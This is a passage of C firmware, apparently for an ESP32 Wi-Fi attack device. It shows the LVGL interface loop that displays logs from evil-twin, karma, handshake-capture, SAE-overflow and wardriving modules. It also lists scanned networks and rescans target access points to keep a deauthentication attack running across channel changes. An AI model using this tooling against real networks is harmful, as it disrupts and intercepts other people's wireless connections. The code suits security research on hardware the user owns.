                while (xQueueReceive(evil_twin_log_queue, &msg, 0) == pdTRUE) {
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(evil_twin_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(evil_twin_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(evil_twin_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(evil_twin_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(evil_twin_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            if (blackout_log_ta && blackout_log_queue) {
                evil_log_msg_t msg;
                while (xQueueReceive(blackout_log_queue, &msg, 0) == pdTRUE) {
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(blackout_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(blackout_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(blackout_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(blackout_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(blackout_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            if (snifferdog_log_ta && snifferdog_log_queue) {
                evil_log_msg_t msg;
                while (xQueueReceive(snifferdog_log_queue, &msg, 0) == pdTRUE) {
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(snifferdog_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(snifferdog_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(snifferdog_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(snifferdog_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(snifferdog_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            if (sniffer_log_ta && sniffer_log_queue) {
                evil_log_msg_t msg;
                while (xQueueReceive(sniffer_log_queue, &msg, 0) == pdTRUE) {
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(sniffer_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(sniffer_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(sniffer_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(sniffer_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(sniffer_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            if (sae_overflow_log_ta && sae_overflow_log_queue) {
                evil_log_msg_t msg;
                // Process max 3 messages per UI cycle to avoid blocking
                int msg_count = 0;
                while (msg_count < 3 && xQueueReceive(sae_overflow_log_queue, &msg, 0) == pdTRUE) {
                    msg_count++;
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(sae_overflow_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(sae_overflow_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(sae_overflow_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(sae_overflow_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(sae_overflow_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            if (handshake_log_ta && handshake_log_queue) {
                evil_log_msg_t msg;
                // Process max 3 messages per UI cycle to avoid blocking
                int msg_count = 0;
                while (msg_count < 3 && xQueueReceive(handshake_log_queue, &msg, 0) == pdTRUE) {
                    msg_count++;
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(handshake_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(handshake_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(handshake_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(handshake_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(handshake_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            if (wardrive_log_ta && wardrive_log_queue) {
                evil_log_msg_t msg;
                while (xQueueReceive(wardrive_log_queue, &msg, 0) == pdTRUE) {
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(wardrive_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(wardrive_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(wardrive_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(wardrive_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(wardrive_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            if (karma_log_ta && karma_log_queue) {
                evil_log_msg_t msg;
                while (xQueueReceive(karma_log_queue, &msg, 0) == pdTRUE) {
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(karma_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(karma_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(karma_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(karma_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(karma_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            // If scan finished, build results UI (but not during blackout/snifferdog/sae_overflow/handshake/wardrive/karma attack)
            if (scan_done_ui_flag) {
                if (blackout_ui_active || snifferdog_ui_active || sae_overflow_ui_active || handshake_ui_active || wardrive_ui_active || karma_ui_active) {
                    // During attacks, just clear the flag without showing results
                    scan_done_ui_flag = false;
                } else {
                scan_done_ui_flag = false;

                if (function_page) { lv_obj_del(function_page); function_page = NULL; }
                reset_function_page_children();
                show_function_page("Scan Results");
                show_touch_dot = true;

                if (scan_list) { lv_obj_del(scan_list); scan_list = NULL; }
                scan_list = lv_list_create(function_page);
                if (!scan_list) {
                    xSemaphoreGive(lvgl_mutex);
                    vTaskDelay(pdMS_TO_TICKS(1));
                    continue;
                }
                lv_obj_set_size(scan_list, lv_pct(100), LCD_V_RES - 30);
                lv_obj_align(scan_list, LV_ALIGN_BOTTOM_MID, 0, 0);
                lv_obj_set_style_bg_color(scan_list, lv_color_make(18, 18, 18), 0);  // Material Dark #121212
                lv_obj_set_style_text_color(scan_list, lv_color_make(255, 255, 255), 0);  // White text
                // Remove separator lines between items
                lv_obj_set_style_border_width(scan_list, 0, LV_PART_ITEMS);
                lv_obj_set_style_border_color(scan_list, lv_color_make(18, 18, 18), LV_PART_ITEMS);

                uint16_t count = wifi_scanner_get_count();
                if (count == 0U) {
                    lv_list_add_text(scan_list, "No networks found");
                } else {
                    uint16_t display_count = (count > SCAN_RESULTS_MAX_DISPLAY) ? SCAN_RESULTS_MAX_DISPLAY : count;

                    wifi_ap_record_t *records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * display_count);
                    if (!records) {
                        lv_list_add_text(scan_list, "Out of memory");
                    } else {
                        int got = wifi_scanner_get_results(records, display_count);
                        if (got < 0) {
                            lv_list_add_text(scan_list, "Failed to fetch results");
                        } else {
                            if (got > display_count) got = display_count;
                            for (int i = 0; i < got; i++) {
                                lv_obj_t *row = lv_list_add_btn(scan_list, NULL, "");
                                if (!row) break;
                                lv_obj_set_width(row, lv_pct(100));
                                lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
                                lv_obj_set_style_pad_all(row, 8, 0);  // 1.2x bigger (was 6, now 8)
                                lv_obj_set_style_pad_gap(row, 10, 0);
                                lv_obj_set_height(row, LV_SIZE_CONTENT);
                                lv_obj_set_style_bg_color(row, lv_color_make(30, 30, 30), LV_STATE_DEFAULT);  // Material Surface
                                lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);  // Lighter on press
                                lv_obj_set_style_radius(row, 8, 0);

                                lv_obj_t *cb = lv_checkbox_create(row);
                                if (!cb) break;
                                lv_checkbox_set_text(cb, "");
                                lv_obj_add_event_cb(cb, scan_checkbox_event_cb, LV_EVENT_VALUE_CHANGED, (void *)(intptr_t)i);
                                // Material checkbox styling
                                lv_obj_set_style_bg_color(cb, lv_color_make(60, 60, 60), LV_PART_INDICATOR);  // Dark gray unchecked
                                lv_obj_set_style_bg_color(cb, lv_color_make(33, 150, 243), LV_PART_INDICATOR | LV_STATE_CHECKED);  // Material Blue checked
                                lv_obj_set_style_border_color(cb, lv_color_make(100, 100, 100), LV_PART_INDICATOR);  // Gray border
                                lv_obj_set_style_border_width(cb, 2, LV_PART_INDICATOR);
                                lv_obj_set_style_radius(cb, 4, LV_PART_INDICATOR);  // Rounded
                                lv_obj_set_style_text_color(cb, lv_color_make(255, 255, 255), 0);  // White text
                                lv_obj_set_style_pad_all(cb, 6, LV_PART_MAIN);

                                lv_obj_t *ssid_lbl = lv_label_create(row);
                                if (!ssid_lbl) break;
                                char name_buf[128];
                                const char *band = (records[i].primary <= 14) ? "2.4GHz" : "5GHz";
                                if (records[i].ssid[0] != 0) {
                                    snprintf(name_buf, sizeof(name_buf), "%s (%s, %02X:%02X:%02X:%02X:%02X:%02X)", 
                                             (const char *)records[i].ssid, band,
                                             records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
                                             records[i].bssid[3], records[i].bssid[4], records[i].bssid[5]);
                                } else {
                                    snprintf(name_buf, sizeof(name_buf), "%02X:%02X:%02X:%02X:%02X:%02X (%s)",
                                             records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
                                             records[i].bssid[3], records[i].bssid[4], records[i].bssid[5], band);
                                }
                                lv_label_set_text(ssid_lbl, name_buf);
                                lv_label_set_long_mode(ssid_lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
                                lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
                                lv_obj_set_style_text_color(ssid_lbl, lv_color_make(255, 255, 255), 0);  // White text
                                lv_obj_align(ssid_lbl, LV_ALIGN_LEFT_MID, 0, 5);  // 5px down for better alignment
                                lv_obj_set_width(ssid_lbl, lv_pct(85));

                                if ((i & 7) == 7) {
                                    vTaskDelay(pdMS_TO_TICKS(1));
                                }
                            }
                        }

                        lv_mem_free(records);

                        if (count > SCAN_RESULTS_MAX_DISPLAY) {
                            char msg[48];
                            snprintf(msg, sizeof(msg), "... and %u more", count - SCAN_RESULTS_MAX_DISPLAY);
                            lv_list_add_text(scan_list, msg);
                        }
                    }
                }
                
                // Resize scan_list to leave space for Next button
                lv_obj_set_size(scan_list, lv_pct(100), LCD_V_RES - 30 - 50);
                lv_obj_align(scan_list, LV_ALIGN_TOP_MID, 0, 30);
                
                // Add "Next" button at the bottom - Material Blue
                lv_obj_t *next_btn = lv_btn_create(function_page);
                lv_obj_set_size(next_btn, lv_pct(100), 45);
                lv_obj_align(next_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
                lv_obj_set_style_bg_color(next_btn, lv_color_make(33, 150, 243), LV_STATE_DEFAULT);  // Material Blue
                lv_obj_set_style_bg_color(next_btn, lv_color_make(66, 165, 245), LV_STATE_PRESSED);  // Lighter blue
                lv_obj_set_style_border_width(next_btn, 0, 0);
                lv_obj_set_style_radius(next_btn, 8, 0);
                lv_obj_set_style_shadow_width(next_btn, 6, 0);
                lv_obj_set_style_shadow_color(next_btn, lv_color_make(0, 0, 0), 0);
                lv_obj_set_style_shadow_opa(next_btn, LV_OPA_30, 0);
                lv_obj_t *next_lbl = lv_label_create(next_btn);
                lv_label_set_text(next_lbl, "Next " LV_SYMBOL_RIGHT);
                lv_obj_set_style_text_color(next_lbl, lv_color_make(255, 255, 255), 0);  // White text
                lv_obj_set_style_text_font(next_lbl, &lv_font_montserrat_16, 0);
                lv_obj_center(next_lbl);
                lv_obj_add_event_cb(next_btn, wifi_scan_next_btn_cb, LV_EVENT_CLICKED, NULL);
                
                }  // End of else block for !blackout_ui_active
            }
            // Update FPS label if on Deauther page
            static uint32_t last_flush_cnt = 0;
            static uint64_t last_us = 0;
            if (deauth_fps_label && function_page) {
                uint64_t now = esp_timer_get_time();
                if (last_us == 0) { last_us = now; last_flush_cnt = lvgl_flush_counter; }
                if (now - last_us >= 1000000) {
                    uint32_t frames = lvgl_flush_counter - last_flush_cnt;
                    char fps_buf[24];
                    snprintf(fps_buf, sizeof(fps_buf), "%u FPS", (unsigned)frames);
                    lv_label_set_text(deauth_fps_label, fps_buf);
                    last_flush_cnt = lvgl_flush_counter;
                    last_us = now;
                }
            }

            // Handle stop/resume flags and update button label
            if (deauth_stop_flag) {
                deauth_stop_flag = false;
                wifi_attacks_stop_deauth();
                if (deauth_pause_btn) {
                    lv_obj_t *label = lv_obj_get_child(deauth_pause_btn, 0);
                    if (label) lv_label_set_text(label, "Resume");
                }
            }
            if (deauth_resume_flag) {
                deauth_resume_flag = false;
                wifi_attacks_start_deauth();
                if (deauth_pause_btn) {
                    lv_obj_t *label = lv_obj_get_child(deauth_pause_btn, 0);
                    if (label) lv_label_set_text(label, "Pause");
                }
            }
            
            // Handle periodic deauth rescan
            if (deauth_rescan_pending && !deauth_rescan_active) {
                deauth_rescan_pending = false;
                
                // Check if deauth UI is still valid before starting rescan
                bool can_rescan = (deauth_list != NULL && function_page != NULL &&
                                   lv_obj_is_valid(deauth_list) && lv_obj_is_valid(function_page));
                
                if (can_rescan) {
                    deauth_rescan_active = true;
                    
                    // Update UI to show rescanning message
                    if (deauth_prompt_label && lv_obj_is_valid(deauth_prompt_label)) {
                        lv_label_set_text(deauth_prompt_label, "Rescanning to double check channels...");
                    }
                    
                    // Clear the network list temporarily
                    lv_obj_clean(deauth_list);
                    lv_obj_t *rescan_msg = lv_label_create(deauth_list);
                    lv_label_set_text(rescan_msg, "Rescanning...");
                    lv_obj_set_style_text_color(rescan_msg, COLOR_MATERIAL_BLUE, 0);
                    lv_obj_set_style_text_font(rescan_msg, &lv_font_montserrat_14, 0);
                    
                    // Pause deauth briefly
                    wifi_attacks_stop_deauth();
                    
                    // Start a new scan (will trigger deauth_rescan_done_flag when complete)
                    wifi_scanner_start_scan();
                } else {
                    // UI no longer valid, just stop the timer
                    ESP_LOGW(TAG, "Deauth rescan skipped - UI no longer valid");
                    deauth_rescan_timer_stop();
                }
            }
            
            // Handle deauth rescan completion (using dedicated flag)
            if (deauth_rescan_done_flag && deauth_rescan_active) {
                deauth_rescan_done_flag = false;
                
                // Validate that deauth UI is still valid before manipulating
                bool ui_valid = (deauth_list != NULL && function_page != NULL && 
                                 lv_obj_is_valid(deauth_list) && lv_obj_is_valid(function_page));
                
                // Get new scan results and check for channel changes
                uint16_t new_count = wifi_scanner_get_count();
                wifi_ap_record_t *new_records = NULL;
                bool channels_updated = false;
                
                if (new_count > 0) {
                    new_records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * new_count);
                    if (new_records) {
                        wifi_scanner_get_results(new_records, new_count);
                        
                        // Check each target for channel changes
                        for (int t = 0; t < deauth_target_count; t++) {
                            for (int n = 0; n < (int)new_count; n++) {
                                if (memcmp(deauth_target_bssids[t], new_records[n].bssid, 6) == 0) {
                                    if (deauth_target_channels[t] != new_records[n].primary) {
                                        ESP_LOGI(TAG, "Channel change detected: %02X:%02X:%02X:%02X:%02X:%02X Ch%d -> Ch%d",
                                                 deauth_target_bssids[t][0], deauth_target_bssids[t][1],
                                                 deauth_target_bssids[t][2], deauth_target_bssids[t][3],
                                                 deauth_target_bssids[t][4], deauth_target_bssids[t][5],
                                                 deauth_target_channels[t], new_records[n].primary);
                                        deauth_target_channels[t] = new_records[n].primary;
                                        channels_updated = true;
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }
                
                // Only update UI if it's still valid
                if (ui_valid) {
                    // Rebuild the deauth list UI with updated channel info
                    lv_obj_clean(deauth_list);
                    
                    if (new_records && new_count > 0) {
                        for (int t = 0; t < deauth_target_count; t++) {
                            // Find matching record for SSID display
                            char ssid_str[33] = "";
                            for (int n = 0; n < (int)new_count; n++) {
                                if (memcmp(deauth_target_bssids[t], new_records[n].bssid, 6) == 0) {
                                    if (new_records[n].ssid[0] != 0) {
                                        strncpy(ssid_str, (const char *)new_records[n].ssid, sizeof(ssid_str) - 1);
                                    }
                                    break;
                                }
                            }
                            
                            char line[128];
                            const char *band = (deauth_target_channels[t] <= 14) ? "2.4" : "5";
                            
                            if (ssid_str[0] != 0) {
                                snprintf(line, sizeof(line), "%s (Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
                                         ssid_str, deauth_target_channels[t], band,
                                         deauth_target_bssids[t][0], deauth_target_bssids[t][1],
                                         deauth_target_bssids[t][2], deauth_target_bssids[t][3],
                                         deauth_target_bssids[t][4], deauth_target_bssids[t][5]);
                            } else {
                                snprintf(line, sizeof(line), "(Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
                                         deauth_target_channels[t], band,
                                         deauth_target_bssids[t][0], deauth_target_bssids[t][1],
                                         deauth_target_bssids[t][2], deauth_target_bssids[t][3],
                                         deauth_target_bssids[t][4], deauth_target_bssids[t][5]);
                            }
                            
                            lv_obj_t *row = lv_list_add_btn(deauth_list, NULL, "");
                            lv_obj_set_width(row, lv_pct(100));
                            lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
                            lv_obj_set_style_pad_all(row, 6, 0);
                            lv_obj_set_style_pad_gap(row, 8, 0);
                            lv_obj_set_height(row, LV_SIZE_CONTENT);
                            lv_obj_set_style_bg_color(row, lv_color_make(30, 30, 30), LV_STATE_DEFAULT);
                            lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
                            lv_obj_set_style_radius(row, 8, 0);
                            
                            lv_obj_t *lbl = lv_label_create(row);
                            lv_label_set_text(lbl, line);
                            lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
                            lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
                            lv_obj_set_style_text_color(lbl, COLOR_MATERIAL_BLUE, 0);
                            lv_obj_set_width(lbl, lv_pct(95));
                        }
                    }
                    
                    // Update title
                    if (deauth_prompt_label && lv_obj_is_valid(deauth_prompt_label)) {
                        lv_label_set_text(deauth_prompt_label, channels_updated ? 
                                          "Deauth attack in progress (channels updated)" : 
                                          "Deauth attack in progress");
                    }
                }
                
                // Free records if allocated
                if (new_records) {
                    lv_mem_free(new_records);
                }
                
                // Re-save targets with updated channels and resume attack
                wifi_scanner_save_target_bssids();
                wifi_attacks_start_deauth();
                
                deauth_rescan_active = false;
                ESP_LOGI(TAG, "Deauth rescan complete, attack resumed");
            }

            // BLE Scan UI update (thread-safe - only update from LVGL task)
            if (ble_scan_needs_ui_update && ble_scan_ui_active) {
                ble_scan_needs_ui_update = false;
                
                // Update status label
                if (ble_scan_status_label) {
                    lv_label_set_text(ble_scan_status_label, ble_scan_status_text);
                }
                
                // Update device list
                ble_scan_update_list();
            }

            sleep_ms = lv_timer_handler();
            
            // Reset watchdog INSIDE mutex to catch long rendering operations
            esp_task_wdt_reset();
            
            xSemaphoreGive(lvgl_mutex);
        }
        
        // Reset watchdog again after releasing mutex
        esp_task_wdt_reset();
        
        vTaskDelay(pdMS_TO_TICKS(sleep_ms > 10 ? 10 : sleep_ms));
    }
}

void lvgl_flush_cb(lv_disp_drv_t *drv, const lv_area_t *area, lv_color_t *color_p)
{
    lvgl_flush_counter++;
    esp_lcd_panel_handle_t panel = (esp_lcd_panel_handle_t)drv->user_data;
    int32_t width = area->x2 - area->x1 + 1;
    int32_t height = area->y2 - area->y1 + 1;
    // Ensure we have valid parameters
    if (color_p == NULL || width <= 0 || height <= 0) {
        ESP_LOGE(TAG, "Invalid flush parameters!");
        lv_disp_flush_ready(drv);
        return;
    }
    
    // CRITICAL: Take SD/SPI mutex before drawing to display
    // Display and SD card share the same SPI bus (SPI2_HOST)
    // Without mutex protection, simultaneous access causes crash: "assert failed: spi_hal_setup_trans"
    // Use short timeout (100ms) - if SD is busy, LVGL will retry on next refresh cycle
    if (sd_spi_mutex) {
        if (xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(100)) == pdTRUE) {
            esp_lcd_panel_draw_bitmap(panel, area->x1, area->y1, area->x2 + 1, area->y2 + 1, color_p);
            xSemaphoreGive(sd_spi_mutex);
        } else {
            // Mutex timeout - SD card operation in progress
            // Skip this refresh, LVGL will call us again
            ESP_LOGD(TAG, "Display refresh skipped - SD busy");
        }
    } else {
        // Mutex not initialized yet (early boot) - draw without protection
        esp_lcd_panel_draw_bitmap(panel, area->x1, area->y1, area->x2 + 1, area->y2 + 1, color_p);
    }
    
    lv_disp_flush_ready(drv);
}

void lvgl_touch_read_cb(lv_indev_drv_t *indev_drv, lv_indev_data_t *data)
{
    static int call_count = 0;
    ft6336_handle_t *touch = (ft6336_handle_t *)indev_drv->user_data;
    ft6336_touch_point_t point;
    
    // Debug counter kept but no console prints (avoid VFS write during draw)
    call_count++;
    if (ui_locked) {
        data->state = LV_INDEV_STATE_RELEASED;
        return;
    }
    
    if (ft6336_read_touch(touch, &point) && point.touched) {
        data->point.x = point.x;
        data->point.y = point.y;
        data->state = LV_INDEV_STATE_PRESSED;
        touch_pressed_flag = true;
        touch_x_flag = point.x;
        touch_y_flag = point.y;
    } else {
        data->state = LV_INDEV_STATE_RELEASED;
        touch_pressed_flag = false;
    }
}

lv_obj_t *create_menu_item(lv_obj_t *parent, const char *icon, const char *text)
{
    lv_obj_t *cont = lv_menu_cont_create(parent);
    lv_obj_set_style_pad_all(cont, 6, 0);  // 1.5x bigger (was 3, now 6)
    lv_obj_set_style_pad_gap(cont, 8, 0);  // 1.5x bigger (was 5, now 8)
    lv_obj_set_style_bg_color(cont, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
    lv_obj_set_style_bg_color(cont, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
    
    if (icon) {
        lv_obj_t *img = lv_img_create(cont);
        lv_img_set_src(img, icon);
        lv_obj_set_width(img, 30);  // 1.5x bigger icon (was 20, now 30)
        lv_obj_set_style_text_color(img, COLOR_MATERIAL_BLUE, 0);  // Green icon
    }
    
    if (text) {
        lv_obj_t *label = lv_label_create(cont);
        lv_label_set_text(label, text);
        lv_label_set_long_mode(label, LV_LABEL_LONG_SCROLL_CIRCULAR);  // Scrolling animation
        lv_obj_set_width(label, 180);  // 1.5x bigger (was 120, now 180)
        lv_obj_set_style_text_font(label, &lv_font_montserrat_20, 0);  // Bigger font (was 14, now 20)
        lv_obj_set_style_text_color(label, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_set_style_anim_time(label, 2000, 0);  // 2 second animation cycle
        lv_obj_set_style_anim_speed(label, 25, 0);  // Animation speed (pixels/sec)
    }
    
    return cont;
}

lv_obj_t *create_clickable_item(lv_obj_t *parent, const char *icon, const char *text, lv_event_cb_t callback, const char *user_data)
{
    // Create button instead of menu_cont for clickable items
    lv_obj_t *btn = lv_btn_create(parent);
    lv_obj_set_size(btn, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_color(btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
    lv_obj_set_style_bg_color(btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
    lv_obj_set_style_radius(btn, 5, 0);
    lv_obj_set_style_pad_all(btn, 12, 0);  // 1.5x bigger (was 8, now 12)
    lv_obj_set_style_pad_gap(btn, 8, 0);  // 1.5x bigger (was 5, now 8)
    lv_obj_set_flex_flow(btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    if (icon) {
        lv_obj_t *icon_label = lv_label_create(btn);
        lv_label_set_text(icon_label, icon);
        lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_20, 0);  // Bigger (was 14, now 20)
        lv_obj_set_style_text_color(icon_label, COLOR_MATERIAL_BLUE, 0);  // Green icons
    }
    
    if (text) {
        lv_obj_t *label = lv_label_create(btn);
        lv_label_set_text(label, text);
        lv_label_set_long_mode(label, LV_LABEL_LONG_SCROLL_CIRCULAR);
        lv_obj_set_width(label, 180);  // 1.5x bigger (was 120, now 180)
        lv_obj_set_style_text_font(label, &lv_font_montserrat_20, 0);  // Bigger (was 14, now 20)
        lv_obj_set_style_text_color(label, COLOR_MATERIAL_BLUE, 0);  // Green text (retro terminal)
        lv_obj_set_style_anim_time(label, 2000, 0);
        lv_obj_set_style_anim_speed(label, 25, 0);
    }
    
    if (callback && user_data) {
        lv_obj_add_event_cb(btn, callback, LV_EVENT_CLICKED, (void*)user_data);
    }
    
    return btn;
}

void back_to_menu_cb(lv_event_t *e)
{
    // Defer navigation to main loop to avoid deleting objects during event handling
    nav_to_menu_flag = true;
}

// Timer callback for periodic deauth rescan
static void deauth_rescan_timer_cb(void *arg)
{
    (void)arg;
    // Set flag to trigger rescan in main loop (don't do heavy work in timer callback)
    if (!deauth_rescan_active) {
        deauth_rescan_pending = true;
    }
}

static void deauth_rescan_timer_start(void)
{
    if (deauth_rescan_timer != NULL) {
        esp_timer_stop(deauth_rescan_timer);
        esp_timer_delete(deauth_rescan_timer);
        deauth_rescan_timer = NULL;
    }
    
    const esp_timer_create_args_t timer_args = {
        .callback = &deauth_rescan_timer_cb,
        .name = "deauth_rescan"
    };
    
    if (esp_timer_create(&timer_args, &deauth_rescan_timer) == ESP_OK) {
        esp_timer_start_periodic(deauth_rescan_timer, DEAUTH_RESCAN_INTERVAL_MS * 1000);
        ESP_LOGI(TAG, "Deauth rescan timer started (every %d seconds)", DEAUTH_RESCAN_INTERVAL_MS / 1000);
    }
}

static void deauth_rescan_timer_stop(void)
{
    if (deauth_rescan_timer != NULL) {
        esp_timer_stop(deauth_rescan_timer);
        esp_timer_delete(deauth_rescan_timer);
        deauth_rescan_timer = NULL;
        ESP_LOGI(TAG, "Deauth rescan timer stopped");
    }
    deauth_rescan_pending = false;
    deauth_rescan_active = false;
